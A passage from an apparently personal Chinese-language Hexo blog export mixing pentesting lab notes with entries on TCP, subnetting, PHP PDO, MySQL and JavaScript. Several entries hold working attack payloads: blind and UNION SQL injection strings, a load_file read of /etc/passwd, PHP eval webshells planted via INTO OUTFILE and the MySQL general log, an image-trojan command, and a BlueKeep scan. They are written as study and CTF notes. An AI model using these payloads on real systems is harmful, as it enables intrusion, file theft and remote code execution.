优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP三次握手]]></title>
    <url>%2F2019%2F08%2F16%2FTCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%2F</url>
    <content type="text"><![CDATA[SYN,ACK,FIN存放在TCP的标志位,一共有6个字符,这里就介绍这三个： SYN 代表请求创建连接,所以在三次握手中前两次要SYN=1,表示这两次用于建立连接,至于第三次什么用,在疑问三里解答。 FIN 表示请求关闭连接,在四次分手时,我们发现FIN发了两遍。这是因为TCP的连接是双向的,所以一次FIN只能关闭一个方向。 ACK 代表确认接受,从上面可以发现,不管是三次握手还是四次分手,在回应的时候都会加上ACK=1,表示消息接收到了,并且在建立连接以后的发送数据时,都需加上ACK=1,来表示数据接收成功。 seq 序列号,什么意思呢？ 当发送一个数据时,数据是被拆成多个数据包来发送,序列号就是对每个数据包进行编号,这样接受方才能对数据包进行再次拼接 为什么需要四次分手？ TCP是双向的，所以需要在两个方向分别关闭，每个方向的关闭又需要请求和确认，所以一共就4次]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>TCP协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin通过日志文件拿webshell]]></title>
    <url>%2F2019%2F08%2F12%2Fphpmyadmin%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%8B%BFwebshell%2F</url>
    <content type="text"><![CDATA[前提: root用户 思路: general log设置为ON 利用mysql的一个日志文件 这个日志文件会记录执行过的sql语句 将这个日志文件修改为.php文件保存 然后执行一条一句话的sql语句 使用菜刀连接即可 三句话 set global general_log=’on’; SET global general_log_file=’C:/webshell/www/cmd.php’; SELECT ‘&lt;?php @eval($_POST[‘cmd’]);?&gt;‘;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片马制作]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[form表单]]></title>
    <url>%2F2019%2F08%2F09%2Fform%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"><![CDATA[&lt;form action=”index.html” method=”post”&gt; 文本&lt;input type=”text” placeholder=”请输入用户名” name=”username”/&gt; 密码&lt;input type=”password” placeholder=”请输入密码” name=”password”/&gt; 单选框性别:&lt;input type=”radio” name=”sex” checked=”checked”/&gt;男&lt;input type=”radio” name=”sex”/&gt;女 name要一致 复选框爱好:&lt;input type=”checkbox” name=”c” id=”c”/&gt;唱歌&lt;input type=”checkbox” name=”t” id=”t” checked=”checked”/&gt;跳舞&lt;input type=”checkbox” name=”r” id=”r” checked=”checked”/&gt;rap checked=”checked” 默认勾选 按钮&lt;input type=”reset” value=”重置” /&gt;&lt;input type=”submit” value=”提交” /&gt; 隐藏域&lt;input type=”hidden” name=”hidden” value=”qwer” /&gt; 文件上传&lt;input type=”file” name=”headimg” formenctype=”multipart/form-data” /&gt;&lt;/form&gt;]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF简单的SQL注入思路]]></title>
    <url>%2F2019%2F07%2F12%2FCTF%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[id=1后面加’,返回报错；加and 1=1，返回正常；加and 1=2，返回报错； 存在注入点。 order by猜字段，order by 1，返回正常；order by 2，返回正常；order by 3，返回错误；猜出字段为2。 查数据库，and 1=2 union select 1,database()，数据库为‘my_db’。 查版本，and 1=2 union select 1,version()，版本为5.5.47。 查表,and 1=2 union select 1, table_name from information_schema.tables,查到名‘thiskey’的表。 查列，and 1=2 union select 1, column_name from information_schema.columns where table_schema=’my_db’ and table_name=’thiskey’,里面就一个数据‘k0y’。 and 1=2 union select 1,k0y from thiskey，成功获取key 链接: http://ctf5.shiyanbar.com/8/index.php?id=1]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-PDO]]></title>
    <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
    <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接Code1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询Code1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据Code1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>函数</tag>
        <tag>PHP</tag>
        <tag>PDO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP连接MySql]]></title>
    <url>%2F2019%2F07%2F10%2FPHP%E8%BF%9E%E6%8E%A5MySql%2F</url>
    <content type="text"><![CDATA[mysqli =&gt; mysql improve函数Code123456789101112131415161718192021$conn=mysqli_connect() //连接数据库mysqli_connect_errno() //获取数据库连接错误号mysqli_connect_error //获取数据库连接错误信息$result=mysqli_query($con,$sql) //执行查询语句mysqli_num_rows //获取查询结果的记录数musqli_affected_rows //获取更新或删除或插入语句影响的记录数mysqli_fetch_assoc //把查询结果集中的一条记录读取为关联数组mysqli_close //关闭数据库连接$row = mysqli_fetch_assoc($result) //将查询结果集保存为关系型数组$row = mysqli_fetch_array($result) //将查询结果集保存为普通数组mysqli_free_result($result) //释放结果集]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>函数</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[子网划分公式]]></title>
    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Code12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 Code12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32Code123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>子网划分</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-0708复现]]></title>
    <url>%2F2019%2F07%2F05%2FCVE-2019-0708%2F</url>
    <content type="text"><![CDATA[概述20190514，微软发布补丁，修复了一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发，影响堪比wannycry。 二级标题Code123456789Windows 7Windows Server 2008 R2Windows Server 2008Windows Server 2003Windows XP msf5扫描search 0708use auxiliary/scanner/rdp/cve_2019_0708_bluekeepset rhosts 192.168.137.190 #靶机IPrun 使用另一个POC攻击会导致靶机蓝屏！]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>msf5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS常量变量]]></title>
    <url>%2F2019%2F07%2F04%2FJS%E5%B8%B8%E9%87%8F%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[常量定义方法 const 常量名 = 值 示例 const PI=3.1415926; PS:常量是程序有运行中不可改变的量 变量定义方法 var 变量名 = 值 示例 var name = 123 变量是程序中可运行的变量 输出 console.log(“haha”) console.log(name) 类型转换 var num = 123 -&gt; typeof num= Number str = String(num) -&gt; typeof str = string Number转换 var i = “123qwe” type Number(i) 返回Number类型console.log(Number(i)) 返回Nan(非数字值的特殊值) parseInt类型转换 只取整数i = “123qwe1230” console.log(parseInt(i)) 输出123,中间有字符同理(包括小数点) i = “qwe123” console.log(parseInt(i)) //Nan parseFloat类型转换 只取小数同理parseInt,忽略第一个小数点 Boolean 为真返回true 为假返回false (非0,非空即为真) Null为空 i=0 -&gt; console.log(Bootlean(i)) -&gt; 返回false 凡是被引号包括的字符串都默认为字符型,引号无法解析变量名(PHP中双引号可以解析变量)]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH服务 容许root登陆]]></title>
    <url>%2F2019%2F06%2F15%2FSSH%E6%9C%8D%E5%8A%A1-%E5%AE%B9%E8%AE%B8root%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[查看ssh服务状态 #/etc/init.d/ssh status 修改配置文件 vim /etc/ssh/sshd_config #PermitRootLogin prohibit-password改为: PermitRootLogin yes #PasswordAuthentication yes改为: PasswordAuthentication yes 启动ssh服务 /etc/init.d/ssh start 查看服务状态 /etc/init.d/ssh status 开机启动 #update-rc.d ssh enable]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql常用命令]]></title>
    <url>%2F2019%2F06%2F10%2FMySql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[修改密码update mysql.user set password=PASSWORD(‘123456’) where User=’root’; 刷新权限flush privileges; 新建数据库Code12345678910CREATE DATABASE `usera` CHARACTER SET &apos;utf8&apos; COLLATE &apos;utf8_general_ci&apos;; 新建数据库,设置字符集CREATE TABLE `user`.`users` ( #在user库中创建users表; `id` int(0) NOT NULL AUTO_INCREMENT, #id int类型,不为空,自动递增 `username` varchar(255) NOT NULL, #username varchar类型,长度255,不为空 `password` varchar(255) NOT NULL, PRIMARY KEY (`id`) #设置主键 id ,主键唯一性); 创建数据库CREATE DATABASE [数据库名]; 创建数据表CREATE TABLE [表名] ([字段名]数据类型,[字段名]数据类型); 插入数据INSERT INTO [表名] ([字段1],[字段2]) VALUES (‘values1’,’values2’); 更新数据UPDATE [表名] SET [字段]=[values] WHERE [字段]=’values’; 删除数据库DROP DATABASE [数据库名]; 删除数据表DROP TABLE [表名]; 删除记录DELETE from [表名] where [字段]=’values’; 用户权限分配create user ‘www’@’localhost’ identified by ‘qwer123456’; 新建数据库用户www,密码为qwer123456,仅本地登录grant select,insert,update on user.users to ‘www’@’localhost’; 在user.users表中授予:增 改 查 权限]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客]]></title>
    <url>%2F2019%2F06%2F09%2Fhexo%2F</url>
    <content type="text"><![CDATA[hexo博客源文件Code12345title: postName #文章页面上的显示名称date: 2013-12-02 15:30:16 #文章生成时间categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面 命令Code123456789hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本hexo s -g #生成并本地预览hexo d -g #生成并上传]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
</search>
